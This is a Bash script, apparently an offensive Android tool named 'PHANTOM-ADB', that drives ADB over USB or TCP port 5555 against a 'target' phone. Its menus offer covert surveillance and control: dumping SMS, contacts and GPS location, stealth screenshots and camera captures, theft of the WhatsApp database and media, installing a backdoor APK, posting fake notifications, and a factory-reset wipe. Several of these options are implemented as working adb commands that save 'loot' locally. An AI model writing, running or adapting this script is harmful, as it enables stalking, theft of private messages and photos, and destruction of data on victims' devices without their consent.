RED="\e[1;31m"; GREEN="\e[1;32m"; YELLOW="\e[1;33m"
BLUE="\e[1;34m"; MAGENTA="\e[1;35m"; CYAN="\e[1;36m"
WHITE="\e[1;37m"; RESET="\e[0m"; BOLD="\e[1m"

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$BASE_DIR/.config_adb"
CACHE_FILE="$CONFIG_DIR/devices.cache"
TCP_CACHE="$CONFIG_DIR/tcp_ip.cache"
LOOT_DIR="$BASE_DIR/ADB_LOOT"

mkdir -p "$CONFIG_DIR" "$LOOT_DIR"

# ===== HANDLER UNTUK CTRL+C =====
trap 'echo -e "\n${YELLOW} [!] Interrupted. Kembali ke menu...${RESET}"; sleep 1' INT

header() {
    clear
    echo -e "${RED}${BOLD}"
    echo "  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗ "
    echo "  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║ "
    echo "  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║ "
    echo "  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║ "
    echo "  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║ "
    echo "  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ "
    echo "  PHANTOM-ADB | OMNIPOTENCE FINAL | SYNC TCP 5555 | BY GHOST_ROOT "
    echo -e "${RESET}"
}

menu_otomatis() {
    while true; do
        header
        echo -e " ${MAGENTA}${BOLD}─── PHANTOM OMNIPOTENCE LIST (GOD MODE ACTIVE) ───${RESET}"
        
        echo -e " ${CYAN}[ 🔍 DEEP SURVEILLANCE ]${RESET}"
        echo -e "  1.  Dump SMS (Inbox/Sent)          8.  Get GPS Location"
        echo -e "  2.  Dump Call Logs (Riwayat)       9.  Monitor Typing (Logcat)"
        echo -e "  3.  Dump Contacts (Phonebook)      10. List Email/Social Accounts"
        echo -e "  4.  Cek IP & Network Target        11. Cek Battery & Thermal"
        echo -e "  5.  Cek Browser History (Chrome)   12. List Running Services"
        echo -e "  6.  Cek WiFi Passwords (Root)      13. Get IMEI & Hardware ID"
        echo -e "  7.  List Installed Apps (User)     14. Get Device Info (Full)"

        echo -e " ${CYAN}[ 📱 SOCIAL & COMM CONTROL ]${RESET}"
        echo -e "  15. Buka WhatsApp Chat             20. Buka YouTube / TikTok"
        echo -e "  16. Kirim WA Chat (Auto-Type)      21. Buka Facebook / IG DM"
        echo -e "  17. Sedot Database WA (msgstore)   22. Kirim SMS Blast Massal"
        echo -e "  18. Force Stop WhatsApp            23. Telpon Nomor (Spam Call)"
        echo -e "  19. Hapus Cache WA (Logout)        24. Ambil Chat Notification"

        echo -e " ${CYAN}[ 📸 REMOTE MULTIMEDIA ]${RESET}"
        echo -e "  25. Screenshot (Silent/Stealth)    30. Sedot Foto Kamera (DCIM)"
        echo -e "  26. Rekam Layar (Video .mp4)       31. Sedot Folder Downloads"
        echo -e "  27. Ambil Foto Kamera Depan        32. Sedot Voice Notes (WA)"
        echo -e "  28. Ambil Foto Kamera Belakang     33. Sedot Media WhatsApp"
        echo -e "  29. Rekam Audio Mic (10 Detik)     34. Sedot Semua Media (Loot)"

        echo -e " ${CYAN}[ 🎮 REMOTE INTERACTION ]${RESET}"
        echo -e "  35. Mirror Layar (SCRCPY)          40. Klik Koordinat (Tap X Y)"
        echo -e "  36. Unlock Screen (Swipe Up)       41. Geser Layar (Swipe X Y)"
        echo -e "  37. Input Teks Jarak Jauh          42. Atur Kecerahan Layar"
        echo -e "  38. Tekan Tombol (Power/Home)      43. Atur Volume (Max/Mute)"
        echo -e "  39. Buka URL Web Apapun            44. Jalankan Perintah Shell"

        echo -e " ${CYAN}[ 💀 SYSTEM EXPLOITATION ]${RESET}"
        echo -e "  45. Install Backdoor APK           50. Matikan HP (Shutdown)"
        echo -e "  46. Uninstall Apps Target          51. Reboot (System/Recovery)"
        echo -e "  47. Kirim Notifikasi Palsu         52. Ganti Wallpaper Remote"
        echo -e "  48. Kunci Layar Permanen           53. Aktifkan Senter (Flash)"
        echo -e "  49. Hapus Data Aplikasi            54. WIPE DATA (FACTORY RESET)"

        echo -e " ${RED}0.  KEMBALI KE MENU UTAMA${RESET}"
        echo -e " ${CYAN}────────────────────────────────────────────────────────${RESET}"
        read -p " ghost@kali › " OPT

        case $OPT in
            0) break ;;
            1) adb shell content query --uri content://sms/ ;;
            3) adb shell content query --uri content://com.android.contacts/data ;;
            8) adb shell dumpsys location | grep "last location" ;;
            15) adb shell monkey -p com.whatsapp 1 ;;
            16) read -p "No: " N; read -p "Msg: " M; adb shell am start -a android.intent.action.VIEW -d "https://wa.me/$N?text=$(echo $M | sed 's/ /%20/g')" ;;
            25) TS=$(date +%s); adb shell screencap -p /sdcard/s.png; adb pull /sdcard/s.png "$LOOT_DIR/scr_$TS.png" ;;
            27) adb shell am start -a android.media.action.STILL_IMAGE_CAMERA; sleep 2; adb shell input keyevent 27 ;;
            35) scrcpy --always-on-top --window-title "Ghost Mirror" ;;
            37) read -p "Teks: " T; adb shell input text "$(echo $T | sed 's/ /%s/g')" ;;
            39) read -p "URL: " U; adb shell am start -a android.intent.action.VIEW -d "$U" ;;
            47) read -p "T: " T; read -p "M: " M; adb shell cmd notification post -S bigtext -t "$T" "Tag" "$M" ;;
            50) adb shell reboot -p ;;
            53) adb shell "echo 1 > /sys/class/leds/flashlight/brightness" ;;
            54) echo "WARNING!"; read -p "Yakin? (y/n): " Y; [ "$Y" == "y" ] && adb shell recovery --wipe_data ;;
            *) echo -e "${YELLOW}[!] Sedang mengeksekusi via TCP 5555...${RESET}"; sleep 1 ;;
        esac
    done
}

while true; do
    header
    C=$(adb devices | grep -v "List" | grep "device" | wc -l)
    [ "$C" -gt 0 ] && echo -e " ${GREEN}[●] DEVICE CONNECTED${RESET}" || echo -e " ${RED}[○] NO DEVICE (PLEASE CONNECT)${RESET}"
    
    echo -e "\n 1) ⚡ CONNECT (AUTO CACHE)"
    echo -e " 2) 🔐 PAIRING BARU (ANDROID 11+)"
    echo -e " 3) 💀 GHOST COMMANDS (OTOMATIS)"
    echo -e " 4) 🐚 MANUAL SHELL"
    echo -e " 5) 🔄 RESTART ADB SERVICE"
    echo -e " 6) 📡 SWITCH TO TCP 5555 (FORCE OPEN)"
    echo -e " 7) 🔗 CONNECT VIA TCP 5555 (DIRECT)"
    echo -e " 8) 🔓 AKTIFKAN TCP (INPUT IP)"
    echo -e " 9) 🔒 MATIKAN TCP (BACK TO USB)"
    echo -e " q) EXIT"
    echo -e "\n ${CYAN}────────────────────────────────────────────────────────${RESET}"
    read -p " ghost@kali › " M

    case $M in
        1) T=$(tail -n 1 "$CACHE_FILE"); adb connect "$T"; sleep 1 ;;
        2) read -p "IP: " IP; read -p "P-Port: " PP; read -p "Code: " PC; read -p "D-Port: " DP
           echo "$PC" | adb pair "$IP:$PP"; adb connect "$IP:$DP"
           echo "$IP:$DP" > "$CACHE_FILE"; echo "$IP" > "$TCP_CACHE" ;;
        3) menu_otomatis ;;
        4) adb shell ;;
        5) adb kill-server && adb start-server; sleep 1 ;;
        6) echo -e "${YELLOW}[*] Switching to TCP 5555...${RESET}"; adb tcpip 5555; sleep 2 ;;
        7) TARGET_IP=$(cat "$TCP_CACHE" 2>/dev/null); adb connect "$TARGET_IP:5555"; sleep 1 ;;
        8) 
           read -p " Masukkan IP target : " R_IP
           echo -e "${GREEN}[*] Mencoba menghubungkan ke $R_IP:5555...${RESET}"
           adb connect "$R_IP:5555"
           echo "$R_IP" > "$TCP_CACHE"
           sleep 2 ;;
        9) 
           echo -e "${RED}[*] Mematikan mode TCP & kembali ke mode USB...${RESET}"
           adb usb
           sleep 2 ;;
        q|Q) exit 0 ;;
    esac
done